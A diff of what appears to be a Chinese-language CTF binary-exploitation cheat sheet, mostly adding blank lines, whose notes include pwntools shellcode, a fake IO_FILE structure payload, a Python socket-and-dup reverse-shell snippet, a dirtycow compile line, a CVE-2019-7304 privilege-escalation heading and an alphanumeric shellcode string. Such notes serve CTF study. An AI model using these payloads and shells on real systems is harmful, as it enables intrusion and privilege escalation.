@@ -134,22 +134,29 @@ def fmt_leak(lenth):
 ## ELF->"/bin/sh"
 	libc.search("/bin/sh").next()
 ## shellcode
+
 	context.arch='amd64'
 	shcode=asm(shellcraft.sh())
+
+
 ## Partial Write Burp
+
 ```sh
 #!/bin/bash
 for i in `seq 1 5000`; do python exp.py; done;
 ```
 
 ## uninitialized variable
+
 堆栈的内容可能被之前的函数控制
 
 ## 遗留数据导致泄露
+
 malloc时候没有memset
 而且写入数据没有用0截断
 
 ## arm & mips 环境
+
 [link][3]
 qemu指定lib路径例如：
 qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add
@@ -157,6 +164,7 @@ qemurun后调试：
 qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add
 
 ## sysmalloc
+
 两个assert
 ```python
 old_size >= 0x1f
@@ -165,6 +173,7 @@ old_end is the end of page
 old_size < nb+MINSIZE
 ```
 ## IO_FILE Payload
+
 ```python
 #32 bits
 fake_file = "/bin/sh\x00" + "\x00" * 0x40 + p32(fake_lock_addr)
@@ -179,12 +188,15 @@ fake_file += p64(fake_lock_addr)
 fake_file = fake_file.ljust(0xd8, '\x00')
 fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr
 ```
+
 ## pwn 远端 命令被ban
+
 尝试cat flag  >&0
 /*输出重定向到stdin ...*/
 stdin也是可以用来输出的。
 
 ## 系统调用表
+
 [x64系统调用表][4]
 [x86系统调用表][5]
 
@@ -194,11 +206,13 @@ sudo vim /etc/hosts
 添加 github.com,github.global.ssl.fastly.net 的ip
 
 ## qira
+
 github 上安装
 按照shellfish的师傅的pull改
 [link][6]
 
 ## dmesg
+
 dmesg用来显示内核环缓冲区（kernel-ring buffer）内容
 
 
@@ -209,12 +223,15 @@ sample:
 "\033[1;31;40m n132>>> \033[0m"
 
 ## echo $?
+
 用于输出上一个程序的退出码
 
 ## gcc 内嵌汇编规则
+
 `https://akaedu.github.io/book/ch19s05.html`
 
 ## ld:自定义入口 arch
+
 `ld -m elf_i386 -static -e n132 -o nier tiny.o`
 one demo
 ```c
@@ -244,6 +261,7 @@ int n132()
 }
 ```
 ## python socket+dup弹shell
+
 ```python
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -256,6 +274,7 @@ p=subprocess.call(["/bin/sh",'-i'])
 做kidding的时候看到的...原来还可以复制stdXXX到socket
 
 ## gdb b 
+
 关于gdb的断点今天被上了一课...
 x64断点最好不要断在某些奇怪的gadget上(被截断产生的gadget)
 rsp_r13_r14_r15=		0x00000000004005bd
@@ -268,6 +287,7 @@ rbx_rbp_r12_r13_r14_r15_ret=	0x0000000004005BA
 
 
 ## .tmux.conf
+
 从swing师傅那边抄的..
 ```python
 set -g prefix C-a
@@ -296,9 +316,12 @@ os.environ={
 ```
 
 ## eviron
+
 .IMPORTANT
 critical~~
+
 ## buffer over flow 
+
 
 gcc 4.9以上 编译简单bof时main会利用ecx/rcx确定rsp
 ```python
@@ -311,6 +334,7 @@ gcc 4.9以上 编译简单bof时main会利用ecx/rcx确定rsp
 利用时可以利用 改ebp-4的值 然后跳到buffer上的 rop..
 
 ## ssh download
+
 scp root@51.254.114.246:/home/tmp/tmp .
 
 ## (CVE-2019-7304)提权
@@ -542,6 +566,7 @@ gcc dirtyc0w.c -o dirtycow -Wall -pthread
 ```
 
 ## nasm编译
+
 nasm -f elf exit.asm
 ```python
 #x86
@@ -549,7 +574,9 @@ ld -o exiter exit.o
 #x64
 ld -m elf_i386 -o exit exit.o
 ```
+
 ## 可见字符shellcode
+
 `PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx`
 
 
